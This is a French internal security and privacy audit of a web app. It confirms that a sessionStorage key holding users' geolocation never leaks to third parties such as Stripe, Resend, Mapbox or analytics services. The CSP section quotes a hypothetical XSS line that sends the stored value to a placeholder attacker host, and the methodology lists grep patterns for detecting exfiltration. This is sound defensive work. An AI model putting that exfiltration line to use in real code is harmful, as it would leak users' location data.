# Audit `sessionStorage` non-fuite vers tiers — T-253

> **Cluster** : T-261 (RGPD pré-Live consolidé) / T-200 r1 (doctrine privacy).
> **Scope** : confirmer que la clé `terroir_geo_session` (DistanceWidget,
> sessionStorage) ne traverse jamais Resend, Stripe, Vercel function logs,
> ni un autre tiers (analytics, RUM, session-replay, error tracking).
> **Méthode** : grep `sessionStorage` + traçage outbound depuis chaque
> read site + cross-réf CSP T-264 (whitelist `connect-src`).
> **Date** : 2026-05-06.

---

## TL;DR

**Audit conforme.** La clé `terroir_geo_session` ne quitte jamais le
navigateur de l'utilisateur. Aucun flux outbound (`fetch`, `XHR`, `Beacon`,
`postMessage` cross-origin) ne lit la clé.

- 2 call sites `sessionStorage` au total dans tout le code applicatif :
  - `terroir_geo_session` (DistanceWidget) — données coords consumer.
  - `terroir_cart_banner_dismissed` (StaleItemsBanner) — flag UI dismiss.
- Aucun helper ni librairie tierce ne lit `sessionStorage` globalement.
- Aucun appel `fetch`/`XHR` ne sérialise la clé `terroir_geo_session` dans
  body / querystring / headers.
- Hors lecture par DistanceWidget lui-même, **zero outbound surface**.
- CSP `connect-src` (T-264) borde l'exfiltration en cas d'XSS hypothétique
  futur (cas R défensif).
- Aucun outil de session-replay / RUM tiers (Sentry, Datadog, LogRocket,
  FullStory) installé — donc aucun snapshot DOM ni snapshot storage
  capturé. Couvert également § T-274.

→ **T-253 peut être marqué ✅ dans la checklist pré-Live.**

---

## Méthodologie

### Patterns grepés
- `sessionStorage` (toute occurrence dans `app/`, `components/`, `lib/`,
  `tests/`, `middleware.ts`, `next.config.js`).
- `terroir_geo_session` (clé exacte).
- `terroir_geo_session.*fetch|fetch.*terroir_geo_session` (motifs
  d'exfiltration directe).
- Helpers tiers connus de capture storage : `Sentry|Datadog|LogRocket|
  FullStory|PostHog|Plausible|gtag|googletagmanager`.
- Linter ESLint `no-restricted-syntax` confirmé sur préfixe `terroir_`
  (`.eslintrc.json:20-24`, T-266 / T-266-bis / T-266-tris).

### Périmètre code
- Toutes les sources applicatives + tests.
- Configuration Next (next.config.js + middleware.ts).
- `package.json` + `package-lock.json` (présence dépendances RUM).

### Hors scope (couverts par d'autres tasks)
- Anti-exfiltration via XSS futur → T-264 (CSP `connect-src`).
- Verrou outils session-replay → T-274.
- Verrou trackers analytics futurs (PostHog) → T-265.
- Scoping cookie sous-domaines → T-276.

---

## Inventaire complet des call sites `sessionStorage` (code applicatif)

### S1. `app/(public)/producteurs/[slug]/_components/DistanceWidget.tsx`
- Clé : `terroir_geo_session` (constante `SESSION_KEY`, ligne 28).
- Read : `readSession()` (ligne 79-110) — `getItem` puis JSON.parse +
  validation défensive (typeof, Number.isFinite, plages WGS84, source
  ∈ {geoloc, postal}).
- Write : `writeSession(session)` (ligne 112-118) — `setItem` JSON
  stringify de `{ lat, lng, source }`.
- Clear : `clearSession()` (ligne 120-126) — `removeItem`.
- **Consommateurs des données lues** : uniquement le composant
  DistanceWidget lui-même, qui calcule la distance Haversine en mémoire
  et l'affiche dans la zone DistanceResult / DistanceOutOfReach. Aucun
  appel `fetch` n'est passé avec cette donnée.

### S2. `app/(consumer)/compte/panier/_components/StaleItemsBanner.tsx`
- Clé : `terroir_cart_banner_dismissed` (constante `SESSION_KEY`, ligne 16).
- Contenu : un hash string des changements panier (cf. `hashChanges`,
  ligne 18-23) — `${nom}::${reason}` joint sur `|`.
- **Hors scope T-253** : ne touche pas aux coords ni au CP. Audité ici
  par exhaustivité — confirmation qu'aucune autre clé sessionStorage
  n'embarque de PII non plus.

→ **Conclusion inventaire** : 2 call sites, 1 seul (S1) embarque des
données géo consumer.

---

## Traçage outbound depuis S1 (DistanceWidget)

### Flux 1 — Géoloc (geolocation API native)
```
navigator.geolocation.getCurrentPosition(success, error, opts)
  → success({ coords: { latitude, longitude, ... } })
    → writeSession({ lat, lng, source: "geoloc" })
      → setSession(...)  [setState React, mémoire]
```
**Aucun fetch outbound.** Les coords issues du browser ne quittent jamais
le navigateur (purement client → state React → sessionStorage du même
navigateur).

### Flux 2 — Saisie CP via formulaire
```
form onSubmit → handlePostal(e)
  → geocodePostalCodeViaApi(postalInput)  [lib/geo/geocode-postal-client.ts]
    → fetch("/api/geocode?cp=" + cp)       [self, route TerrOir]
  → writeSession({ lat, lng, source: "postal" })
    → setSession(...)
```
**Outbound unique** : `GET /api/geocode?cp=XXXXX` vers TerrOir self
(connect-src `'self'`, conforme CSP T-264).
- Le payload outbound est **le CP saisi**, pas la clé `terroir_geo_session`
  ni les coords résolues. Le serveur n'a pas connaissance du contenu de
  `sessionStorage`.
- Le serveur cache CP→coords dans `geocode_cache` (donnée publique INSEE,
  cf. T-219 + audit T-249) et ne joint jamais user_id ni IP à cette table.

### Flux 3 — Reset (bouton "Changer ma position")
```
onReset → clearSession() → removeItem(SESSION_KEY)
```
Aucun outbound.

### Flux 4 — Distance recalculée à chaque mount fiche
```
useMemo([session, producerLat, producerLng])
  → haversineKm(session.lat, session.lng, producerLat, producerLng)
```
Calcul **purement local** (mémoire JS). Aucun outbound.

### Surface globale outbound réelle
- 1 seul outbound traversant la session courante DistanceWidget :
  `/api/geocode?cp=...`. Ne fuit pas la clé.
- 0 outbound vers Stripe, Resend, Vercel Analytics, Mapbox ou tout autre
  tiers depuis le composant.

---

## Verrous existants (defense in depth)

### V1. Test contractuel anti-leak CP
`tests/app/producteurs/distance-widget-interactive.test.tsx:346-348` :
```ts
// Verrou anti-leak : le CP saisi NE doit PAS être stocké en sessionStorage
expect(window.sessionStorage.getItem(SESSION_KEY)).not.toContain("75001");
```
→ Vérifie que seuls `lat`, `lng`, `source` sont persistés ; le CP saisi
n'apparaît pas. Test non-régression contre toute future "optimisation"
qui voudrait re-stocker le CP pour skip un re-geocode.

### V2. CSP `connect-src` restrictif (T-264)
Cf. `docs/security/csp-audit-t-264-2026-05-06.md`. Whitelist effective :
- `'self'`
- `api.stripe.com`, `api.mapbox.com`, `*.tiles.mapbox.com`,
  `events.mapbox.com`
- `va.vercel-scripts.com`, `vitals.vercel-analytics.com`
- `https://<TERROIR_SUPABASE_HOST>` + `wss://<TERROIR_SUPABASE_HOST>`

Aucune destination attacker-controllable. En cas d'XSS futur (mode
`'unsafe-inline'` toléré), un script `fetch("https://attacker.tld/x?d="
+ sessionStorage.getItem("terroir_geo_session"))` serait bloqué (en
enforce, prévu 2026-05-12) ou signalé (Report-Only actuel).

### V3. Lint préfixe `terroir_` opposable
`.eslintrc.json:20-24` (T-266 / T-266-bis / T-266-tris) : toute future clé
`sessionStorage` / `localStorage` doit être préfixée `terroir_`. Bénéfice
audit : grep `terroir_` donne **l'inventaire exhaustif** des clés
TerrOir, sans risque qu'un dev oublie ou utilise un préfixe différent.

### V4. Validation défensive lecture sessionStorage
`DistanceWidget.tsx:85-105` (T-239 + T-240 r3) : la lecture rejette
toute valeur corrompue (mauvais types, NaN, coords hors plages WGS84,
source ≠ geoloc/postal). Bénéfice privacy : un script tiers qui aurait
écrit dans la clé (XSS hypothétique) ne peut pas faire afficher des
distances arbitraires — la validation rejette silencieusement et le
widget repart sur l'état neutre.

### V5. Aucune dépendance RUM / session-replay (cf. T-274)
Grep tout repo + `package-lock.json` : aucune occurrence de `Sentry`,
`Datadog`, `LogRocket`, `FullStory`, `PostHog`, `Plausible`, `gtag`,
`googletagmanager` dans le code applicatif (uniquement docs / TODO).
Vercel Analytics installé (`va.vercel-scripts.com`) capture uniquement
les Core Web Vitals (LCP, FID, CLS, INP, TTFB) — pas de DOM snapshot,
pas de capture sessionStorage / localStorage. Cf. doc Vercel Analytics
sur le scope minimal.

---

## Surface tierce résiduelle — analyse explicite

### Resend
- Appelé exclusivement côté **serveur** (`lib/resend/send.ts`,
  `lib/resend/client.ts`). Le navigateur consumer n'a jamais accès au
  client Resend.
- Aucun template email ne reçoit `terroir_geo_session` en metadata
  (grep `metadata` côté `sendTemplate` — aucun champ géo).
- → Pas de surface fuite Resend.

### Stripe
- Stripe Elements / PaymentRequest API chargés via `js.stripe.com`
  (script-src + frame-src). Le SDK Stripe n'a pas accès aux clés
  `sessionStorage` du parent (browser sandbox iframe Elements).
- Aucun `metadata` Stripe (PaymentIntent / Checkout / Customer) ne reçoit
  de coords / CP consumer (grep complet `lib/stripe/` + `app/api/stripe/`
  → zéro match).
- → Pas de surface fuite Stripe.

### Mapbox
- Connect-src whitelist `api.mapbox.com`, `*.tiles.mapbox.com`,
  `events.mapbox.com`. Mapbox-gl peut envoyer des télémétries usage
  (mouvements carte, requêtes tiles).
- Le DistanceWidget **ne charge pas Mapbox** (composant pur `<div>` +
  inputs, pas de map). Mapbox est utilisé sur d'autres pages (`/carte`).
- Sur la fiche producteur (où le widget vit), Mapbox n'est pas chargé →
  pas de surface télémétrie embarquant la coord consumer.
- À surveiller si une fiche producteur intégrait demain une mini-carte :
  vérifier que la coord `terroir_geo_session` n'est jamais passée à
  Mapbox-gl (`flyTo`, `fitBounds`, marker.setLngLat) directement — le
  pattern actuel est de calculer Haversine en pur JS.

### Vercel Analytics
- Capture uniquement les **métriques agrégées** Core Web Vitals (cf.
  `@vercel/analytics` + `@vercel/speed-insights` SDKs). Aucune capture
  DOM, aucune capture storage.
- → Pas de surface fuite.

### Service Workers
- TerrOir n'enregistre **aucun service worker** (grep
  `serviceWorker.register` → 0 résultats). Aucun risque qu'un SW
  intercepte les requêtes outbound.

---

## Recommandations

### R1. Garder la doctrine "sessionStorage = inputs uniquement, jamais outputs"
**Priorité** : moyenne (déjà documentée commentaire DistanceWidget.tsx
lignes 22-27).

Le commentaire actuel dans le composant est verbeux et précis sur le
pourquoi (distance recalculée, jamais cachée). Cf. T-267 (backlog) qui
prévoit déjà de documenter la clé `terroir_geo_session` globalement —
pourrait être l'occasion d'ériger en doctrine opposable :

> Toute donnée géo persistée côté navigateur reste un INPUT (coord
> consumer brute) ; les outputs (distance, CP, ferme la plus proche…)
> sont recalculés à chaque mount.

Bénéfice : empêche un futur dev d'introduire une exfiltration cachée via
un cache "innocent" qui agrége plusieurs visites en un payload outbound.

### R2. Articulation T-265 (trackers front)
**Priorité** : forte si décision PostHog confirmée pré-Live.

Le helper `lib/analytics/track.ts` (à créer) doit rejeter explicitement
toute lecture `sessionStorage.getItem(SESSION_KEY)` qui passerait par un
event tracker. Doctrine déjà tracée mémo
`project_event_tracking_archi.md`.

### R3. Renforcer la convention V3 lint preuve par grep
**Priorité** : faible (déjà acquis via lint).

Pour rendre auditable de l'extérieur (audit T-003), ajouter dans
`docs/conventions/lint-storage-namespace-2026-05-06.md` un script de
vérification reproductible :
```
grep -r 'sessionStorage\.\(getItem\|setItem\|removeItem\)' \
  app/ components/ lib/ \
  | grep -v 'terroir_'
```
Sortie attendue : vide. Si non vide → T-266 violé, à corriger.

→ Non bloquant pré-Live. Optimisation auditeur.

---

## Cross-références

- `docs/security/csp-audit-t-264-2026-05-06.md` (T-264) — anti-exfiltration
  XSS via CSP `connect-src`.
- `docs/security/audit-logs-serveur-non-capture-cp-coords-2026-05-06.md`
  (T-249) — confirme côté serveur que CP / coords n'apparaissent jamais
  dans logs / audit_logs / Resend / Stripe metadata.
- `docs/conventions/lint-storage-namespace-2026-05-06.md` (T-266) — règle
  ESLint préfixe `terroir_` opposable.
- `docs/fixes/storage-keys-migration-2026-05-06.md` (T-266-bis /
  T-266-tris) — historique migration des clés.
- **Tasks liées** :
  - T-264 — CSP. Couvert.
  - T-265 — exclusion CP des trackers front (à venir).
  - T-274 — vérification absence session-replay (couvert ici § V5).
  - T-276 — scoping `terroir_geo_session` cookie cross-subdomain.

---

## Conclusion

T-253 ✅ — la clé `terroir_geo_session` reste strictement locale au
navigateur de l'utilisateur. Aucun flux outbound (fetch / XHR / Beacon /
postMessage / Service Worker / RUM) ne la lit ni ne la transmet à un
service tiers. La defense in depth (CSP T-264 + test contractuel V1 +
lint V3) borde le risque d'évolution future qui voudrait introduire une
exfiltration directe ou indirecte.
